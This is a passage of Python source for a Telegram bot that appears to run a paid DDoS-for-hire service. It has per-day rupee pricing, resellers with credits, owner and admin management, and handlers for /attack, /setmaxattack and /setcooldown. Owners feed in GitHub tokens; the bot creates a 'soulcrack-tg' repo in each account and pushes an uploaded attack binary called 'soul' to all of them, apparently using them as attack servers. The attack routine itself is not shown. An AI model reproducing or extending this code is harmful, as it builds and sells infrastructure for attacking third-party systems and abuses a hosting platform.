    resellers_list = "💰 **ʀᴇsᴇʟʟᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        expiry = reseller_info.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                expiry_date = time.strftime("%Y-%ᴍ-%ᴅ", time.localtime(expiry_time))
                expiry = expiry_date
            except:
                pass
        resellers_list += f"• `{reseller_id}` - @{username}\n  ᴄʀᴇᴅɪᴛs: {credits} | ᴇxᴘɪʀʏ: {expiry}\n"
    
    await update.message.reply_text(resellers_list)

async def pricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💰 **ᴘʀɪᴄᴇ ʟɪsᴛ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "• 1 ᴅᴀʏ - ₹120\n"
        "• 2 ᴅᴀʏs - ₹240\n"
        "• 3 ᴅᴀʏs - ₹360\n"
        "• 4 ᴅᴀʏs - ₹450\n"
        "• 7 ᴅᴀʏs - ₹650\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴀᴄᴄᴇss"
    )

async def resellerpricelist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💰 **ʀᴇsᴇʟʟᴇʀ ᴘʀɪᴄᴇ ʟɪsᴛ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "• 1 ᴅᴀʏ - ₹150\n"
        "• 2 ᴅᴀʏs - ₹250\n"
        "• 3 ᴅᴀʏs - ₹300\n"
        "• 4 ᴅᴀʏs - ₹400\n"
        "• 7 ᴅᴀʏs - ₹550\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ғᴏʀ ʀᴇsᴇʟʟᴇʀ ᴀᴄᴄᴇss"
    )

async def listgrp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ғᴏʀ ᴀᴅᴍɪɴs ᴏɴʟʏ."
        )
        return
    
    if not groups:
        await update.message.reply_text("📭 ɴᴏ ɢʀᴏᴜᴘs")
        return
    
    groups_list = "👥 **ɢʀᴏᴜᴘs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for group_id, group_info in groups.items():
        groups_list += f"• `{group_id}` - {group_info.get('name', 'ᴜɴᴋɴᴏᴡɴ')}\n"
    
    await update.message.reply_text(groups_list)


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ."
        )
        return
    
    await update.message.reply_text(
        "📢 **ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ:"
    )
    
    return WAITING_FOR_BROADCAST

async def broadcast_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ᴘᴇʀᴍɪssɪᴏɴ ᴅᴇɴɪᴇᴅ")
        return ConversationHandler.END
    
    message = update.message.text
    await send_broadcast(update, context, message)
    return ConversationHandler.END

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str):
    
    all_users = set()
    
    
    for user_id in approved_users.keys():
        all_users.add(int(user_id))
    
    
    for user_id in resellers.keys():
        all_users.add(int(user_id))
    
    
    for user_id in admins.keys():
        all_users.add(int(user_id))
    
    
    for user_id in owners.keys():
        all_users.add(int(user_id))
    
    total_users = len(all_users)
    success_count = 0
    fail_count = 0
    
    progress_msg = await update.message.reply_text(
        f"📢 **sᴇɴᴅɪɴɢ ʙʀᴏᴀᴅᴄᴀsᴛ...**\n"
        f"ᴛᴏᴛᴀʟ ᴜsᴇʀs: {total_users}"
    )
    
    for user_id in all_users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 **ʙʀᴏᴀᴅᴄᴀsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n{message}"
            )
            success_count += 1
            time.sleep(0.1)
        except:
            fail_count += 1
    
    await progress_msg.edit_text(
        f"✅ **ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• ✅ sᴜᴄᴄᴇssғᴜʟ: {success_count}\n"
        f"• ❌ ғᴀɪʟᴇᴅ: {fail_count}\n"
        f"• 📊 ᴛᴏᴛᴀʟ: {total_users}\n"
        f"• 📝 ᴍᴇssᴀɢᴇ: {message[:50]}..."
    )


async def addowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_primary_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴀᴅᴅ ᴏᴡɴᴇʀs."
        )
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "👑 **ᴀᴅᴅ ᴏᴡɴᴇʀ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ ᴜsᴇʀ ɪᴅ ᴀɴᴅ ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ ᴀᴅᴅ ᴀs ᴏᴡɴᴇʀ:\n\n"
            "ᴜsᴀɢᴇ: /addowner <ᴜsᴇʀ_ɪᴅ> <ᴜsᴇʀɴᴀᴍᴇ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /addowner 12345678 johndoe"
        )
        return
    
    try:
        new_owner_id = int(context.args[0])
        username = context.args[1]
        
        if str(new_owner_id) in owners:
            await update.message.reply_text("❌ ᴛʜɪs ᴜsᴇʀ ɪs ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴏᴡɴᴇʀ")
            return
        
        
        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)
        
        
        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)
        
        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)
        
        
        try:
            await context.bot.send_message(
                chat_id=new_owner_id,
                text="👑 **ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴀs ᴀɴ ᴏᴡɴᴇʀ ᴏғ ᴛʜᴇ ʙᴏᴛ!\nʏᴏᴜ ɴᴏᴡ ʜᴀᴠᴇ ғᴜʟʟ ᴀᴄᴄᴇss ᴛᴏ ᴀʟʟ ᴀᴅᴍɪɴ ғᴇᴀᴛᴜʀᴇs."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **ᴏᴡɴᴇʀ ᴀᴅᴅᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴏᴡɴᴇʀ ɪᴅ: `{new_owner_id}`\n"
            f"ᴜsᴇʀɴᴀᴍᴇ: @{username}\n"
            f"ᴀᴅᴅᴇᴅ ʙʏ: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ")

async def deleteowner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_primary_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀs."
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "🗑️ **ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /deleteowner <ᴜsᴇʀ_ɪᴅ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /deleteowner 12345678"
        )
        return
    
    try:
        owner_to_remove = int(context.args[0])
        
        if str(owner_to_remove) not in owners:
            await update.message.reply_text("❌ ᴛʜɪs ᴜsᴇʀ ɪs ɴᴏᴛ ᴀɴ ᴏᴡɴᴇʀ")
            return
        
        
        if owners[str(owner_to_remove)].get("is_primary", False):
            await update.message.reply_text("❌ ᴄᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ")
            return
        
        
        removed_username = owners[str(owner_to_remove)].get("username", "")
        del owners[str(owner_to_remove)]
        save_owners(owners)
        
        
        try:
            await context.bot.send_message(
                chat_id=owner_to_remove,
                text="⚠️ **ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜʀ ᴏᴡɴᴇʀ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ ғʀᴏᴍ ᴛʜᴇ ʙᴏᴛ."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **ᴏᴡɴᴇʀ ʀᴇᴍᴏᴠᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴏᴡɴᴇʀ ɪᴅ: `{owner_to_remove}`\n"
            f"ᴜsᴇʀɴᴀᴍᴇ: @{removed_username}\n"
            f"ʀᴇᴍᴏᴠᴇᴅ ʙʏ: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ")


async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴀᴅᴅ ʀᴇsᴇʟʟᴇʀs."
        )
        return
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "💰 **ᴀᴅᴅ ʀᴇsᴇʟʟᴇʀ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /addreseller <ᴜsᴇʀ_ɪᴅ> <ᴄʀᴇᴅɪᴛs> <ᴜsᴇʀɴᴀᴍᴇ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /addreseller 12345678 100 johndoe"
        )
        return
    
    try:
        reseller_id = int(context.args[0])
        credits = int(context.args[1])
        username = context.args[2]
        
        if str(reseller_id) in resellers:
            await update.message.reply_text("❌ ᴛʜɪs ᴜsᴇʀ ɪs ᴀʟʀᴇᴀᴅʏ ᴀ ʀᴇsᴇʟʟᴇʀ")
            return
        
        
        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "LIFETIME",
            "total_added": 0
        }
        save_resellers(resellers)
        
        
        try:
            await context.bot.send_message(
                chat_id=reseller_id,
                text=f"💰 **ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴀᴅᴅᴇᴅ ᴀs ᴀ ʀᴇsᴇʟʟᴇʀ!\nɪɴɪᴛɪᴀʟ ᴄʀᴇᴅɪᴛs: {credits}\n\nʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴀᴅᴅ ᴜsᴇʀs ᴜsɪɴɢ /add ᴄᴏᴍᴍᴀɴᴅ."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **ʀᴇsᴇʟʟᴇʀ ᴀᴅᴅᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ʀᴇsᴇʟʟᴇʀ ɪᴅ: `{reseller_id}`\n"
            f"ᴜsᴇʀɴᴀᴍᴇ: @{username}\n"
            f"ᴄʀᴇᴅɪᴛs: {credits}\n"
            f"ᴀᴅᴅᴇᴅ ʙʏ: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ ᴏʀ ᴄʀᴇᴅɪᴛs")

async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀs."
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "🗑️ **ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /removereseller <ᴜsᴇʀ_ɪᴅ>\n"
            "ᴇxᴀᴍᴘʟᴇ: /removereseller 12345678"
        )
        return
    
    try:
        reseller_to_remove = int(context.args[0])
        
        if str(reseller_to_remove) not in resellers:
            await update.message.reply_text("❌ ᴛʜɪs ᴜsᴇʀ ɪs ɴᴏᴛ ᴀ ʀᴇsᴇʟʟᴇʀ")
            return
        
        
        removed_username = resellers[str(reseller_to_remove)].get("username", "")
        del resellers[str(reseller_to_remove)]
        save_resellers(resellers)
        
        
        try:
            await context.bot.send_message(
                chat_id=reseller_to_remove,
                text="⚠️ **ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜʀ ʀᴇsᴇʟʟᴇʀ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ ғʀᴏᴍ ᴛʜᴇ ʙᴏᴛ."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **ʀᴇsᴇʟʟᴇʀ ʀᴇᴍᴏᴠᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ʀᴇsᴇʟʟᴇʀ ɪᴅ: `{reseller_to_remove}`\n"
            f"ᴜsᴇʀɴᴀᴍᴇ: @{removed_username}\n"
            f"ʀᴇᴍᴏᴠᴇᴅ ʙʏ: `{user_id}`"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ")


async def addtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴀᴅᴅ ᴛᴏᴋᴇɴs."
        )
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /addtoken <ɢɪᴛʜᴜʙ_ᴛᴏᴋᴇɴ>"
        )
        return
    
    token = context.args[0]
    repo_name = "soulcrack-tg"
    
    try:
        for existing_token in github_tokens:
            if existing_token['token'] == token:
                await update.message.reply_text("❌ ᴛᴏᴋᴇɴ ᴀʟʀᴇᴀᴅʏ ᴇxɪsᴛs.")
                return
        
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        repo, created = create_repository(token, repo_name)
        
        new_token_data = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'status': 'active'
        }
        github_tokens.append(new_token_data)
        save_github_tokens(github_tokens)
        
        if created:
            message = (
                f"✅ **ɴᴇᴡ ʀᴇᴘᴏ ᴄʀᴇᴀᴛᴇᴅ & ᴛᴏᴋᴇɴ ᴀᴅᴅᴇᴅ!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 ᴜsᴇʀɴᴀᴍᴇ: `{username}`\n"
                f"📁 ʀᴇᴘᴏ: `{repo_name}`\n"
                f"📊 ᴛᴏᴛᴀʟ sᴇʀᴠᴇʀs: {len(github_tokens)}"
            )
        else:
            message = (
                f"✅ **ᴛᴏᴋᴇɴ ᴀᴅᴅᴇᴅ ᴛᴏ ᴇxɪsᴛɪɴɢ ʀᴇᴘᴏ!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 ᴜsᴇʀɴᴀᴍᴇ: `{username}`\n"
                f"📁 ʀᴇᴘᴏ: `{repo_name}`\n"
                f"📊 ᴛᴏᴛᴀʟ sᴇʀᴠᴇʀs: {len(github_tokens)}"
            )
        
        await update.message.reply_text(message)
        
    except Exception as e:
        await update.message.reply_text(f"❌ **ᴇʀʀᴏʀ**\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ᴛʜᴇ ᴛᴏᴋᴇɴ.")

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴠɪᴇᴡ ᴛᴏᴋᴇɴs."
        )
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 ɴᴏ ᴛᴏᴋᴇɴs ᴀᴅᴅᴇᴅ ʏᴇᴛ.")
        return
    
    tokens_list = "🔑 **sᴇʀᴠᴇʀs ʟɪsᴛ:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, token_data in enumerate(github_tokens, 1):
        tokens_list += f"{i}. 👤 `{token_data['username']}`\n   📁 `{token_data['repo']}`\n\n"
    
    tokens_list += f"📊 **ᴛᴏᴛᴀʟ sᴇʀᴠᴇʀs:** {len(github_tokens)}"
    await update.message.reply_text(tokens_list)

async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ʀᴇᴍᴏᴠᴇ ᴛᴏᴋᴇɴs."
        )
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: /removetoken <ɴᴜᴍʙᴇʀ>"
        )
        return
    
    try:
        token_num = int(context.args[0])
        if token_num < 1 or token_num > len(github_tokens):
            await update.message.reply_text(f"❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ. ᴜsᴇ 1-{len(github_tokens)}")
            return
        
        removed_token = github_tokens.pop(token_num - 1)
        save_github_tokens(github_tokens)
        
        await update.message.reply_text(
            f"✅ **sᴇʀᴠᴇʀ ʀᴇᴍᴏᴠᴇᴅ!**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 sᴇʀᴠᴇʀ: `{removed_token['username']}`\n"
            f"📁 ʀᴇᴘᴏ: `{removed_token['repo']}`\n"
            f"📊 ʀᴇᴍᴀɪɴɪɴɢ: {len(github_tokens)}"
        )
        
    except ValueError:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ")


async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴏɴʟʏ ᴏᴡɴᴇʀs ᴄᴀɴ ᴜᴘʟᴏᴀᴅ ʙɪɴᴀʀʏ."
        )
        return ConversationHandler.END
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ sᴇʀᴠᴇʀs ᴀᴅᴅᴇᴅ. ᴜsᴇ /addtoken ғɪʀsᴛ."
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📤 **ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴍᴇ ʏᴏᴜʀ ʙɪɴᴀʀʏ ғɪʟᴇ...\n"
        "ɪᴛ ᴡɪʟʟ ʙᴇ ᴜᴘʟᴏᴀᴅᴇᴅ ᴛᴏ ᴀʟʟ ɢɪᴛʜᴜʙ ʀᴇᴘᴏs ᴀs `soul` ғɪʟᴇ."
    )
    
    return WAITING_FOR_BINARY

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ ᴘᴇʀᴍɪssɪᴏɴ ᴅᴇɴɪᴇᴅ")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ғɪʟᴇ, ɴᴏᴛ ᴛᴇxᴛ.")
        return WAITING_FOR_BINARY
    
    progress_msg = await update.message.reply_text("📥 **ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ʏᴏᴜʀ ʙɪɴᴀʀʏ ғɪʟᴇ...**")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        
        await progress_msg.edit_text(
            f"📊 **ғɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ: {file_size} ʙʏᴛᴇs**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📤 ᴜᴘʟᴏᴀᴅɪɴɢ ᴛᴏ ᴀʟʟ ɢɪᴛʜᴜʙ ʀᴇᴘᴏs..."
        )
        
        success_count = 0
        fail_count = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                
                try:
                    existing_file = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(
                        BINARY_FILE_NAME,
                        "Update binary file",
                        binary_content,
                        existing_file.sha,
                        branch="main"
                    )
                    results.append((token_data['username'], True, "Updated"))
                except Exception as e:
                    repo.create_file(
                        BINARY_FILE_NAME,
                        "Upload binary file", 
                        binary_content,
                        branch="main"
                    )
                    results.append((token_data['username'], True, "Created"))
                    
            except Exception as e:
                results.append((token_data['username'], False, str(e)))
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1
        
        os.remove(file_path)
        
        message = (
            f"✅ **ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **ʀᴇsᴜʟᴛs:**\n"
            f"• ✅ sᴜᴄᴄᴇssғᴜʟ: {success_count}\n"
            f"• ❌ ғᴀɪʟᴇᴅ: {fail_count}\n"
            f"• 📊 ᴛᴏᴛᴀʟ: {len(github_tokens)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📁 **ғɪʟᴇ:** `{BINARY_FILE_NAME}`\n"
            f"📦 **ғɪʟᴇ sɪᴢᴇ:** {file_size} ʙʏᴛᴇs\n"
            f"⚙️ **ʙɪɴᴀʀʏ ʀᴇᴀᴅʏ:** ✅"
        )
        
        await progress_msg.edit_text(message)
        
    except Exception as e:
        await progress_msg.edit_text(f"❌ **ᴇʀʀᴏʀ**\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")
    
    return ConversationHandler.END

async def cancel_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ **ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ ᴄᴀɴᴄᴇʟʟᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━")
    return ConversationHandler.END


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    
    if update.message and update.message.text and update.message.text.startswith('/'):
        
        return
    
    
    pass


def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    
    conv_handler_binary = ConversationHandler(
        entry_points=[CommandHandler('binary_upload', binary_upload_command)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, handle_binary_file),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    
    conv_handler_broadcast = ConversationHandler(
        entry_points=[CommandHandler('broadcast', broadcast_command)],
        states={
            WAITING_FOR_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message_handler),
                CommandHandler('cancel', cancel_upload)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_upload)]
    )
    
    
    application.add_handler(conv_handler_binary)
    application.add_handler(conv_handler_broadcast)
    
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    
    
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("userslist", userslist_command))
    application.add_handler(CommandHandler("approveuserslist", approveuserslist_command))
    application.add_handler(CommandHandler("ownerlist", ownerlist_command))
    application.add_handler(CommandHandler("adminlist", adminlist_command))
    application.add_handler(CommandHandler("resellerlist", resellerlist_command))
    application.add_handler(CommandHandler("pricelist", pricelist_command))
    application.add_handler(CommandHandler("resellerpricelist", resellerpricelist_command))
    application.add_handler(CommandHandler("listgrp", listgrp_command))
    application.add_handler(CommandHandler("maintenance", maintenance_command))
    application.add_handler(CommandHandler("setcooldown", setcooldown_command))
    application.add_handler(CommandHandler("setmaxattack", setmaxattack_command)) 
    application.add_handler(CommandHandler("gentrailkey", gentrailkey_command)) 
    application.add_handler(CommandHandler("removexpiredtoken", removexpiredtoken_command))  
    
   
    application.add_handler(CommandHandler("addowner", addowner_command))
    application.add_handler(CommandHandler("deleteowner", deleteowner_command))
    
    
    application.add_handler(CommandHandler("addreseller", addreseller_command))
    application.add_handler(CommandHandler("removereseller", removereseller_command))
    
    
    application.add_handler(CommandHandler("addtoken", addtoken_command))
    application.add_handler(CommandHandler("tokens", tokens_command))
    application.add_handler(CommandHandler("removetoken", removetoken_command))
    
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 **ᴛʜᴇ ʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ...**")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print(f"👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀs: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 sᴇᴄᴏɴᴅᴀʀʏ ᴏᴡɴᴇʀs: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
